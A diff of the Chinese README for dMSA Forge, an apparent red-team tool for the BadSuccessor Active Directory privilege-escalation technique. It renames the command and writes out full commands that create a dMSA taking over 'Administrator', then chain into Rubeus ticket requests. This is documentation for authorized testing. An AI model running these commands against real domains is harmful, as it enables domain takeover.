@@ -1,12 +1,12 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.14)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.15)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **语言：** [English](../README.md) | 简体中文 | [Français](README.fr.md)
 
-当前版本：`v0.5.14`
+当前版本：`v0.5.15`
 
 面向授权 [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP 工作流的 [dMSA](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge：assess、add、verify、delete。
 
@@ -52,36 +52,36 @@ python -m pip install ./dmsa-forge
 安装后运行：
 
 ```bash
-dmsa-forge -h
+dmsaforge -h
 ```
 
 有新版本时，直接更新当前正在使用的环境：
 
 ```bash
-dmsa-forge update
+dmsaforge update
 ```
 
-`update` 会先比较当前安装版本和目标发布版本。版本相同就跳过 pip；只要版本不同就更新，不比较高低。只有明确想跳过版本检查时才使用 `dmsa-forge update --force`。
+`update` 会先比较当前安装版本和目标发布版本。版本相同就跳过 pip；只要版本不同就更新，不比较高低。只有明确想跳过版本检查时才使用 `dmsaforge update --force`。
 
 常用帮助入口：
 
 ```bash
-dmsa-forge add -h
-dmsa-forge update --dry-run
+dmsaforge add -h
+dmsaforge update --dry-run
 ```
 
-如果不安装、只在源码检出目录中使用，可运行 `./dmsa-forge.py`。
-下面的示例使用直接对应任务的命令和现代 `--long-option` 参数。
+如果不安装、只在源码检出目录中使用，可运行 `./dmsaforge.py`。
+下面的示例使用直接对应任务的命令和常用短选项。偏好显式名称的脚本仍可使用长选项。
 
 ## 快速开始
 
-使用 safe profile 预览 add。README 中的命令刻意采用一行可复制形式；如果需要使用 `proxychains -f chain1080.conf -q` 这类本地 wrapper，把它放在 `dmsa-forge` 前面即可。
+使用 safe profile 预览 add。README 中的命令刻意采用一行可复制形式；如果需要使用 `proxychains -f chain1080.conf -q` 这类本地 wrapper，把它放在 `dmsaforge` 前面即可。
 
 ```bash
-dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --profile safe -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
-默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；设置 `--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。对 `add` 来说，必须显式选择 `--target-account` 指向要接替的账号，并用 `--principals-allowed` 指定可读取托管密码的主体。
+默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；设置 `-d/--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。对 `add` 来说，必须用 `-t/--target-account` 显式选择 predecessor account，并用 `--principals-allowed` 指定可读取托管密码的主体。
 
 模板使用 `redpen` 作为建议 dMSA 名，使用 `Administrator` 作为常见 predecessor account 示例。授权链路指向其它对象时，请替换对应值。
 
@@ -92,52 +92,52 @@ dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --target
 评估 OU 权限：
 
 ```bash
-dmsa-forge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
+dmsaforge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
 ```
 
 添加前验证：
 
 ```bash
-dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
 ```
 
 计划添加：
 
 ```bash
-dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加：
 
 ```bash
-dmsa-forge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
+dmsaforge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen -t 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加后验证：
 
 ```bash
-dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
+dmsaforge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen
 ```
 
 用完后删除：
 
 ```bash
-dmsa-forge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --yes
+dmsaforge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com -o 'OU=Dev,DC=redteamnotes,DC=com' -d redpen --yes
 ```
 
 `add` 或 `verify` 验证成功后，`Next steps` 会直接给出具体的外部 Kerberos 命令。生成流程会先执行 `Rubeus hash`，再把输出中的 AES256 值用于 `asktgt`，最后执行 dMSA `asktgs` 请求。
 
-目标账号解析基于 LDAP 搜索。`--target-account` 会写入 `msDS-ManagedAccountPrecededByLink`；`--principals-allowed` 会决定写入 `msDS-GroupMSAMembership` 的 SID。assess 生成的后续命令可以带上发现的 principal SID，但目标账号仍然必须由操作者明确选择。
+目标账号解析基于 LDAP 搜索。`-t/--target-account` 会写入 `msDS-ManagedAccountPrecededByLink`；`--principals-allowed` 会决定写入 `msDS-GroupMSAMembership` 的 SID。assess 生成的后续命令可以带上发现的 principal SID，但目标账号仍然必须由操作者明确选择。
 
 安全控制：
 
-- 使用 `dmsa-forge plan ACTION ...`、`--dry-run` 或 `--plan` 校验参数并打印计划 LDAP 操作，不会打开 LDAP 连接。
+- 使用 `dmsaforge plan ACTION ...`、`--dry-run` 或 `--plan` 校验参数并打印计划 LDAP 操作，不会打开 LDAP 连接。
 - 使用 `--profile safe` 启用默认脱敏 dry-run 预设，`--profile report` 启用 JSON 报告，`--profile ci` 启用 quiet JSON/no-banner 输出。
 - `DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；合法的 `--scope-base-dn` 也可以提供默认 base DN。授权范围不同时再显式覆盖。
-- 未指定 `--method` 和 `--port` 时，先尝试 LDAP/389。如果连接失败，dMSA Forge 可以继续尝试 LDAPS/636，并把候选尝试写入终端输出和 JSON/文本报告。单独传 `--port 636` 会推断为 LDAPS；同时指定 `--method` 和 `--port` 时才要求完全匹配。
-- 设置 `--dmsa-name` 后，`--dns-hostname` 默认推断为 `<dmsa-name>.<account-domain>`。
+- 未指定 `-m/--method` 和 `-p/--port` 时，先尝试 LDAP/389。如果连接失败，dMSA Forge 可以继续尝试 LDAPS/636，并把候选尝试写入终端输出和 JSON/文本报告。单独传 `-p 636` 会推断为 LDAPS；同时指定 method 和 port 时才要求完全匹配。
+- 设置 `-d/--dmsa-name` 后，`--dns-hostname` 默认推断为 `<dmsa-name>.<account-domain>`。
 - 使用 `--dc-host` 指定 DC 主机名；只有 DNS 或路由需要 IP 覆盖时才传 `--dc-ip`。自动 DC IP 解析不会做网络探测；multicast、loopback、link-local、unspecified、broadcast 和 reserved 结果会被拒绝，避免 proxy DNS 占位地址（例如 `224.0.0.1`）进入 Kerberos `/dc:` 参数。
-- 对 `assess` 来说，`--target-ou` 用于缩小 OU 评估基准。DC 前置检查是 best-effort；失败时会继续 OU 评估并记录 warning。
+- 对 `assess` 来说，`-o/--ou` 用于缩小 OU 评估基准。DC 前置检查是 best-effort；失败时会继续 OU 评估并记录 warning。
 - 目标账号名和 `--principals-allowed` 名称解析会优先选择精确的 `sAMAccountName`、UPN 或 CN 匹配。LDAP 结果有歧义时默认失败，并提示传完整 DN 或 SID。
 - `delete` 必须显式传入 `--yes`。旧的 `modify` 工作流已移除；请使用 `delete`、`add` 和 `verify`。
 - 本地输出默认脱敏。`--no-redact` 必须同时使用 `--debug`。
